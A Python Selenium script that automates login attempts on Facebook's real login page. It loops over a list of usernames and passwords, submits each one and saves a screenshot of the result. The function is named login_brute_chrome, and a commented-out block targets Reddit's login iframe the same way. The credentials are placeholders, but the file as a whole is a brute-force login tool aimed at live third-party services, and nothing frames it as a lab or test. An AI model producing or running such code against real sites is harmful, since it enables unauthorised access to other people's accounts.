from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time


class GetChrome:

    def __init__(self, url, driver=webdriver.Chrome
                 (service=ChromeService(ChromeDriverManager().install()))):
        self.driver = driver
        time.sleep(1)
        driver.get(url)

    def element_finder(self, by, value):
        return self.driver.find_element(by, value)

    def screen(self, name):
        self.driver.save_screenshot(name)


# test_reddit.element_finder(By.XPATH, '//a[@class="_3Wg53T10KuuPmyWOMWsY2F'
#                                   ' Z_HUY3BUsGOBOtdmH94ZS _2iuoyPiKHN3'
#                                   'kfOoeIQalDT _10BQ7pjWbeYP63SAPNS8Ts'
#                                   ' HNozj_dKjQZ59ZsfEegz8 _2nelDm85zKK'
#                                   'muD94NequP0"]').click()
# time.sleep(1)
# test_reddit.driver.switch_to.frame(test_reddit.element_finder(By.TAG_NAME, 'iframe'))
# test_reddit.element_finder(By.XPATH, '//input[@id="loginUsername"]').send_keys("Prompt")
# test_reddit.element_finder(By.XPATH, '//input[@id="loginPassword"]').send_keys("123" + Keys.ENTER)
# time.sleep(1)
########################################################################################################
# def login_brute_chrome_iframe(option, user):
#     test = GetChrome(option["url"])
#     login = f'{user[ "nick" ]}'
#     parole = f'{user["password"]}'
#     test.element_finder(option["form_sel"], option["form_val"]).click()
#     time.sleep(1)
#     test.driver.switch_to.frame(test.element_finder(option["frame_sel"], option["frame_val"]))
#     test.element_finder(option["name_sel"], option["name_val"]).send_keys(login)
#     time.sleep(2)
#     test.element_finder(option["pass_sel"], option["pass_val"]).send_keys(parole + Keys.ENTER)
#     time.sleep(1)
#     test.screen(f'{option["scr"]}{time.time()}.png')
#
#
# page = "https://www.reddit.com/"
# form_s, form_v = By.XPATH, '//a[@class="_3Wg53T10KuuPmyWOMWsY2F'\
#                                   ' Z_HUY3BUsGOBOtdmH94ZS _2iuoyPiKHN3'\
#                                   'kfOoeIQalDT _10BQ7pjWbeYP63SAPNS8Ts'\
#                                   ' HNozj_dKjQZ59ZsfEegz8 _2nelDm85zKK'\
#                                   'muD94NequP0"]'
# frame_s, frame_v = By.TAG_NAME, "iframe"
# name_s, name_v = By.XPATH, '//input[@id="loginUsername"]'
# pass_s, pass_v = By.XPATH, '//input[@id="loginPassword"]'
# screen = "reddit"
# a = {
#     "url": page,
#     "form_sel": form_s,
#     "form_val": form_v,
#     "frame_sel": frame_s,
#     "frame_val": frame_v,
#     "name_sel": name_s,
#     "name_val": name_v,
#     "pass_sel": pass_s,
#     "pass_val":  pass_v,
#     "scr": screen
# }
# for i in range(3):
#     x = ["prompt1", "prompt2", "prompt3"]
#     y = [123, 456, 789]
#     b = {
#         "nick": x[i],
#         "password": y[i]
#     }
#     login_brute_chrome_iframe(a, b)
#########################################################################
def login_brute_chrome(option, user):
    login = f'{user["nick"]}'
    parole = f'{user["password"]}'
    test = GetChrome(option["url"])
    time.sleep(1)
    test.element_finder(option["name_sel"], option["name_val"]).send_keys(login)
    time.sleep(2)
    test.element_finder(option["pass_sel"], option["pass_val"]).send_keys(parole + Keys.ENTER)
    test.screen(f"{option['scr']}{time.time()}.png")
    time.sleep(1)


page = "https://www.facebook.com/"
name_s, name_v = By.XPATH, '//input[@name = "email"]'
pass_s, pass_v = By.XPATH, '//input[@name = "pass"]'
screen = "facebook"
a = {
    "url": page,
    "name_sel": name_s,
    "name_val": name_v,
    "pass_sel": pass_s,
    "pass_val":  pass_v,
    "scr": screen
}
for i in range(3):
    x = ["prompt1", "prompt2", "prompt3"]
    y = [123, 456, 789]
    b = {
        "nick": x[i],
        "password": y[i]
    }
    login_brute_chrome(a, b)
